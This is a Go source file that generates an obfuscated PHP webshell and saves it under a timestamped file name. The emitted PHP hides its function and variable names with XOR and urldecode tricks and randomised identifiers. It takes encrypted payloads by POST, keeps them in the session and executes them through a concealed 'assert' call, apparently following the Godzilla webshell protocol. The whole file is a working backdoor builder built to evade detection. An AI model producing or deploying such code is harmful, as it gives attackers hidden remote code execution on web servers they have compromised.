package webshell

import (
	"fmt"
	"os"
	"time"
)

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
const length = 10

var Key string = generateRandomString(6)
var CurrentDict string
var logo = `
<pre>


														/***
														*        o                 o    
														*       d8b               d8b   
														*      d888b             d888b  
														*     d8P"Y8b           d8P"Y8b 
														*                               
														*                               
														*                               
														*             88888888          
														*                               
														*                               
														*                               
														*/

  </pre>
`

func WebCreate() {
	currentTime := time.Now()
	dateString := currentTime.Format("2006-01-02_15-04") // 格式化日期为"年-月-日"

	filePath := fmt.Sprintf("%s.php", dateString) // 拼接文件名
	CurrentDict, err := os.Getwd()
	if err != nil {
		fmt.Println("无法获取当前目录:", err)
		return
	}
	fmt.Println()
	fmt.Println()
	fmt.Print("文件保存路径为 :", CurrentDict, "\\", filePath, "\n\n")

	// 创建或打开文件
	file, err := os.Create(filePath)
	if err != nil {
		fmt.Println("无法创建文件:", err)
		return
	}

	// 将标准输出重定向到文件
	os.Stdout = file

	random_function_encode := "Xioa__--__" + generateRandomString(length)
	random_function_var_D := "Xioa__--__" + generateRandomString(length+1)
	random_function_var_K := "Xioa__--__" + generateRandomString(length+2)
	random_function_var_i := "Xioa__--__" + generateRandomString(length+3)
	random_function_var_C := "Xioa__--__" + generateRandomString(length+4)
	passName := "Xioa__--__" + generateRandomString(length+5)
	pass := "~urldecode('%A7').~urldecode('%96').~urldecode('%90').~urldecode('%9E');"
	payloadName := "Xioa__--__" + generateRandomString(length+6)
	md5_key := MD5(Key)
	confuse := "/*" + generateRandomString(length+6) + "*/"
	keyName := "Xioa__--__" + generateRandomString(length+7)
	payload := `~urldecode("%8F%9E%86%93%90%9E%9B")`
	POST := "'_'.('~'^'.').('`'^'/').('('^'{').('('^'|')"
	random_post := "Xioa__--__" + generateRandomString(length+8)
	random_data := "Xioa__--__" + generateRandomString(length+9)
	random_payload := "Xioa__--__" + generateRandomString(length+10)
	random_S := "Xioa__--__" + generateRandomString(length+11)
	assert_string := `('!'^'@').('('^'[').('('^'[').('%'^'@').(')'^'[').('('^'\\')`
	random_assert := "Xioa__--__" + generateRandomString(length+12)
	fmt.Printf("<h2>webshell create by Xioaruan</h2>\n<h1>%v</h1>", logo)
	fmt.Println("")
	fmt.Println("<?php")
	fmt.Println("@session_start();")
	fmt.Println("@set_time_limit(ChR('48'));")
	fmt.Println("@error_reporting(cHr('48'));")
	fmt.Printf("function %v($%v,$%v){\n", random_function_encode, random_function_var_D, random_function_var_K)
	fmt.Printf("    for($%v=ChR('48');$%v<strlen($%v);$%v++) {\n", random_function_var_i, random_function_var_i, random_function_var_D, random_function_var_i)
	fmt.Printf("        $%v = $%v[$%v+Chr('49')&cHr('49').chR('53')];\n", random_function_var_C, random_function_var_K, random_function_var_i)
	fmt.Printf("        $%v[$%v] = $%v[$%v]^$%v;\n", random_function_var_D, random_function_var_i, random_function_var_D, random_function_var_i, random_function_var_C)
	fmt.Printf("    }\n")
	fmt.Printf("    return $%v;\n", random_function_var_D)
	fmt.Printf("}\n")
	fmt.Printf("$%v=%v\n", passName, pass)
	fmt.Printf("$%v=%v;\n", payloadName, payload)
	fmt.Printf("$%v='%v';\n", keyName, md5_key)
	fmt.Printf("$_=%v;\n", POST)
	fmt.Printf("$%v=Chr('83');\n", random_S)
	fmt.Printf("$%v=$$_;\n", random_post)
	fmt.Printf("$%v=%v;\n", random_assert, assert_string)

	fmt.Printf("if (isset($%v%v[$%v])){\n", random_post, confuse, passName)
	fmt.Printf("    $%v=%v(base64_decode($%v[$%v]),$%v);\n", random_data, random_function_encode, random_post, passName, keyName)
	fmt.Printf("    if (isset($_SESSION[$%v])){\n", payloadName)
	fmt.Printf("        $%v=%v($_SESSION[$%v],$%v);\n", random_payload, random_function_encode, payloadName, keyName)
	fmt.Printf(`        if (strpos($%v,base64_decode("Z2V0QmFzaWNz'.$%v.'W5mbw=="))===false){`, random_payload, random_S)
	fmt.Println()
	fmt.Printf("            $%v=%v($%v,$%v);\n", random_payload, random_function_encode, random_payload, keyName)
	fmt.Println("        }")
	fmt.Printf("		$%v($%v);\n", random_assert, random_payload)
	fmt.Printf("        echo substr(md5($%v.$%v),0,16);\n", passName, keyName)
	fmt.Printf("        echo base64_encode(%v(@run($%v),$%v));\n", random_function_encode, random_data, keyName)
	fmt.Printf("        echo substr(md5($%v.$%v),16);\n", passName, keyName)
	fmt.Println("    }else{")
	fmt.Printf(`        if (strpos($%v,base64_decode("Z2V0QmFzaWNz'.$%v.'W5mbw=="))!==false){`, random_data, random_S)
	fmt.Println()
	fmt.Printf("            $_SESSION[$%v]=%v($%v,$%v);\n", payloadName, random_function_encode, random_data, keyName)
	fmt.Println("        }")
	fmt.Println("    }")
	fmt.Println("}")
	file.Close()

}
